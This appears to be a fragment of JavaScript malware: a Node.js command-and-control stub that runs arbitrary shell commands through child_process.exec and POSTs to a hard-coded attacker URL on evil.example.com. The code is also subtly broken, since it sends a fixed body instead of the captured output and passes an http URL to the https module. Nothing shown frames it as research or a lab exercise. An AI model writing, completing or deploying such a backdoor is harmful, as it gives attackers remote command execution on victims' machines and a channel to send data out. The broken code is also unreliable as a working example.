const C2_URL = "http://evil.example.com:8080/task";
const { exec } = require("child_process");
const https = require("https");
const body = JSON.stringify({ result: "out" });
function run(cmd) {
  exec(cmd, (err, stdout, stderr) => {
    const out = stdout || stderr || "";
    const req = https.request(C2_URL, { method: "POST", headers: { "content-type": "application/json" } });
    req.write(body);
    req.end();
  });
}
